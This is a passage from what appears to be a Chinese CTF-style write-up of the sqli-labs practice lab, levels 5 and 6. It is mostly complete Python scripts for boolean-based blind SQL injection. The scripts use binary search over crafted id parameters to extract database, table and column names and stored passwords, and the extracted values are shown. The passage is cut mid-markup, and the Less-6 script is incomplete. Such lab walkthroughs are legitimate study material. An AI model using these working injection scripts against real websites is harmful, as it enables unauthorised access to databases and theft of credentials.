class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> *<br><br>url=<span class="hljs-string">&quot;http://127.0.0.1/Less-5/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_db_len</span>(<span class="hljs-params">url</span>):</span>            <span class="hljs-comment">#获取当前数据库长度</span><br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and length(database())&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>        response=get(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and length(database())=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>    response=get(judge)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_table_len</span>(<span class="hljs-params">url,index</span>):</span>   <span class="hljs-comment">#获取当前数据库第index个表的长度</span><br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>        response=get(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>    response=get(judge)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_column_len</span>(<span class="hljs-params">url,index1,index2</span>):</span>   <span class="hljs-comment">#获取数据库第index1个表的第index2个字段的长度 </span><br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    table_name=get_table_name(url,index1)<br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>        response=get(payload)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>    response=get(judge)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data_len</span>(<span class="hljs-params">url,index1,index2,index3</span>):</span>       <span class="hljs-comment">##获取数据库第index1个表的第index2个字段的第index3个数据</span><br>    table_name=get_table_name(url,index1)<br>    column_name=get_column_name(url,index1,index2)<br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and length((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>        response=get(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and length((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>    response=get(judge)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_db_name</span>(<span class="hljs-params">url,db_len</span>):</span>           <span class="hljs-comment">#获取当前数据库名</span><br>    db_name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,db_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and ascii(substr((select database()),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>            response=get(payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and ascii(substr((select database()),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>        response=get(judge)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        db_name+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> db_name<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_table_name</span>(<span class="hljs-params">url,index</span>):</span>           <span class="hljs-comment">#获取第index个数据表表名</span><br>    table_len=get_table_len(url,index)<br>    table_name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,table_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>            response=get(payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1)=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>        response=get(judge)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        table_name+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> table_name <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_column_name</span>(<span class="hljs-params">url,index1,index2</span>):</span>          <span class="hljs-comment">#获取数据库第index1个表的第index2个字段的长度</span><br>    column_len=get_column_len(url,index1,index2)<br>    table_name=get_table_name(url,index1)<br>    column_name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,column_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>            response=get(payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>        response=get(judge)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        column_name+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> column_name <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>(<span class="hljs-params">url,index1,index2,index3</span>):</span>      <span class="hljs-comment">#获取数据库第index1个表的第index2个字段的第index3个数据</span><br>    data_len=get_data_len(url,index1,index2,index3)<br>    column_name=get_column_name(url,index1,index2)<br>    table_name=get_table_name(url,index1)<br>    data=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,data_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and ascii(substr((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>            response=get(payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and ascii(substr((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>        response=get(judge)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        data+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> data<br><br>index1=<span class="hljs-number">3</span><br>index2=<span class="hljs-number">2</span><br>index3=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(get_db_name(url,get_db_len(url)))<br><span class="hljs-built_in">print</span>(get_table_name(url,index1))<br><span class="hljs-built_in">print</span>(get_column_name(url,index1,index2))<br><span class="hljs-built_in">print</span>(get_data(url,index1,index2,index3))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">security</span><br><span class="hljs-string">users</span><br><span class="hljs-string">password</span><br><span class="hljs-string">p@ssword</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="less-6"><a href="#less-6" class="headerlink" title="less 6"></a>less 6</h2>less 5的单引号变成双引号，直接上脚本：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> *<br><br>url=<span class="hljs-string">&quot;http://127.0.0.1/Less-6/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_db_len</span>(<span class="hljs-params">url</span>):</span>            <span class="hljs-comment">#获取当前数据库长度</span><br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        payload=url+<span class="hljs-string">f&quot;?id=1\&quot; and length(database())&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>        response=get(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    judge=url+<span class="hljs-string">f&quot;?id=1\&quot; and length(database())=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>    response=get(judge)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_table_len</span>(<span class="hljs-params">url,index</span>):</span>   <span class="hljs-comment">#获取当前数据库第index个表的长度</span><br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        payload=url+<span class="hljs-string">f&quot;?id=1\&quot; and length((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>        response=get(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    judge=url+<span class="hljs-string">f&quot;?id=1\&quot; and length((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>    response=get(judge)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_column_len</span>(<span class="hljs-params">url,index1,index2</span>):</span>   <span class="hljs-comment">#获取数据库第index1个表的第index2个字段的长度 </span><br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    table_name=get_table_name(url,index1)<br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        payload=url+<span class="hljs-string">f&quot;?id=1\&quot; and length((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>        response=get(payload)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    judge=url+<span class="hljs-string">f&quot;?id=1\&quot; and length((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>    response=get(judge)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data_len</span>(<span class="hljs-params">url,index1,index2,index3</span>):</span>       <span class="hljs-comment">##获取数据库第index1个表的第index2个字段的第index3个数据</span><br>    table_name=get_table_name(url,index1)<br>    column_name=get_column_name(url,index1,index2)<br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        payload=url+<span class="hljs-string">f&quot;?id=1\&quot; and length((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>        response=get(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    judge=url+<span class="hljs-string">f&quot;?id=1\&quot; and length((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>    response=get(judge)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_db_name</span>(<span class="hljs-params">url,db_len</span>):</span>           <span class="hljs-comment">#获取当前数据库名</span><br>    db_name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,db_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            payload=url+<span class="hljs-string">f&quot;?id=1\&quot; and ascii(substr((select database()),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>            response=get(payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        judge=url+<span class="hljs-string">f&quot;?id=1\&quot; and ascii(substr((select database()),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>        response=get(judge)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        db_name+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> db_name<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_table_name</span>(<span class="hljs-params">url,index</span>):</span>           <span class="hljs-comment">#获取第index个数据表表名</span><br>    table_len=get_table_len(url,index)<br>    table_name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,table_len+<span 